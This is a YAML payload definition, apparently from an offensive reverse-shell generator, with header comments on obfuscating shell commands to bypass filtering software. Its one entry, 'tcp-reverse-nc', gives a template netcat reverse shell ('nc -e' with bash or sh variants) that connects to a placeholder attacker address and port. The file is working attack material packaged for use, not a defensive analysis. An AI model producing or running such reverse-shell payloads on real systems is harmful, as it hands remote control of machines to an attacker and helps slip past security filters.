---

# This file defines all kinds of obfuscators to run against shell commands.
# Shells could be any of bash, sh, zsh, csh, cmd, PowerShell, etc...
#
# The purpose of command obfuscator is:
#   1. to eliminate any kind of badchars used by the payload (or use a different set of chars)
#   2. hide/obfuscate the code to bypass filtering software
#
# -------------------------------------------------------------------------------------------------
# Available variables:
#   {PAYLOAD}                # The payload string that will be replaced in here
#                            # so that the obfuscator can use it.
#                            # NOTE: Can only be used within payload key
#
# -------------------------------------------------------------------------------------------------
# Required root keys:
#   type: str                # Obfuscator type
#   version: str             # Current version (bumps on changes)
#   encoders: List[dict]     # List of used encoder function
#
# -------------------------------------------------------------------------------------------------
# Required item keys:
#   name: str                # display name
#   desc: str                # short description
#   filters: dict            # <see below>
#   payload: str             # the obfuscator code (The {PAYLOAD} variable must be used here)
#   meta: dict               # <see below>
#
# -------------------------------------------------------------------------------------------------
# Required item filters:
#   shells: List[str]        # For what underlying shells does this obfuscator code work?
#                            # NOTE: This is independent of the actual payload code.
#                            # Shell filter will be an intersectional set of
#                            # obfuscator and payload.
#
#   commands: List[str]      # Required shell commands for the obfuscator
#                            # NOTE: This will be summed up with the required shell
#                            # commands used by the payload
#
#   obfuscator: List[str]    # List of used obfuscator functions
#                            # NOTE: this is only used for filtering / output display
#
# -------------------------------------------------------------------------------------------------
# Required meta keys:
#   authors: List[str]       # List of authors who have worked on it
#   created: str             # Initial creation date
#   modified: str            # Modification date
#   version: str             # obfuscator version (bumps on change)


# Meta definitions
type: cmd
command: nc
version: 0.0.1


# Payload list
payloads:
  - name: tcp-reverse-nc
    desc: TCP reverse shell with nc command
    info:
      - "nc is not usually installed - especially with -e argument"
    meta:
      authors: ["cytopia"]
      created: "2021-04-08"
      modified: "2021-04-08"
      version: 0.0.1
    filters:
      # exe:   will be populated by 'command' from root level
      cmd_exe: nc
      cmd_shell: "{VAR:shell}{VAR:minus_i}"
      shell: bash
      shells: ["bash", "sh", "csh", "zsh", "tcsh"]
      os: ["bsd", "linux", "mac"]
      commands: ["nc", "bash"]
      encoders: []
      proto: tcp
      direction: reverse
    variables:
      - name: minus_i
        values:
          - value: " -i"
      - name: shell
        values:
          - value: bash
            filters:
              shell: bash
              commands: ["nc", "bash"]
          - value: sh
            filters:
              shell: sh
              commands: ["nc", "sh"]
          - value: /bin/bash
            filters:
              shell: bash
              commands: ["nc", "bash"]
          - value: /bin/sh
            filters:
              shell: sh
              commands: ["nc", "sh"]
    payload: |-
      nc -e {VAR:shell}{VAR:minus_i} __ADDR__ __PORT__
